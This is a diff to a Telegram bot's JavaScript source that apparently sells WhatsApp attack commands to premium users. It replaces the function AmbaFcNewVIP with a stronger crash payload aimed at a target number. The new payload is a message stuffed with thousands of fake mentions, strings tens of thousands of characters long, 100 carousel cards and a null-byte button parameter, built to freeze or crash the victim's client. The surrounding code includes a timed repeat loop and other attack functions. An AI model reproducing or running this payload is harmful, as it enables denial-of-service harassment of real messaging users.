@@ -4189,44 +4189,6 @@ bot.hears(/^(\/)?(xloli|savage)(\s|$)/i, checkWhatsAppConnection, checkPremium, 
   });
 });
 
-async function AmbaFcNewVIP(sock, target) {
-  try {
-    await sock.relayMessage(target, {
-      groupStatusMessageV2: {
-        message: {
-          messageContextInfo: {
-            mentionedJid: [target]
-          },
-          viewOnceMessageV2: {
-            message: {
-              imageMessage: {
-                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
-                mimetype: "image/jpeg",
-                fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
-                fileLength: 99999999999,
-                height: 1080,
-                width: 1080,
-                mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
-                fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
-                directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
-                mediaKeyTimestamp: 99999999999999
-              }
-            }
-          }
-        }
-      },
-      messageContextInfo: {
-        mentionedJid: [target]
-      }
-    }, {
-      participant: { jid: target },
-      messageId: null
-    });
-  } catch (err) {
-    console.error("error nJiRlAh:", err);
-  }
-}
-
 async function TrdxtCount(duration, target) {
   const totalDuration = duration * 60 * 60 * 1000;
   const startTime = Date.now();
@@ -4555,6 +4517,69 @@ async function blankbyambajahat(sock, target) {
   } catch (e) {
     console.log("error jir fix kan lu dev - " + e.message);
   }
+}
+
+async function AmbaFcNewVIP(sock, target) {
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      imageMessage: {
+        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw",
+        mimetype: "image/jpeg",
+        fileSha256: Buffer.from("WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=", "base64"),
+        fileLength: 99999999,
+        height: 1080,
+        width: 1080,
+        mediaKey: Buffer.from("qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=", "base64"),
+        fileEncSha256: Buffer.from("JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=", "base64"),
+        directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw",
+        jpegThumbnail: Buffer.alloc(1000, 0),
+        contextInfo: {
+          mentionedJid: Array.from({ length: 1500 }, (_, i) => `1${i}@s.whatsapp.net`),
+          groupMentions: [{
+            groupJid: "0@g.us",
+            groupSubject: "AmbaGaBaik" + "ꦾ".repeat(50000)
+          }]
+        }
+      }
+    },
+    viewOnceMessageV2: {
+      message: {
+        interactiveMessage: {
+          header: {
+            title: "Amba? Jahat Bgt" + "ោ៝".repeat(40000),
+            hasMediaAttachment: true,
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw",
+              mimetype: "image/jpeg",
+              fileSha256: Buffer.from("WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=", "base64"),
+              mediaKey: Buffer.from("qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=", "base64")
+            }
+          },
+          body: {
+            text: "© Gapon Real" + "꧀".repeat(50000)
+          },
+          carouselMessage: {
+            cards: Array.from({ length: 100 }, () => ({
+              header: {
+                title: "𝐀⃟𝐌𝐁𝐀𝐉𝐀𝐇⃢𝐀𝐓" + "ြ".repeat(10000),
+                hasMediaAttachment: true
+              },
+              nativeFlowMessage: {
+                buttons: [{
+                  name: "single_select_reply",
+                  buttonParamsJson: "\0"
+                }]
+              }
+            }))
+          }
+        }
+      }
+    }
+  }, {
+    participant: { jid: target },
+    userJid: target,
+    messageId: null
+  });
 }
 //-------------- END FUNCTION -------------//
 bot.launch();
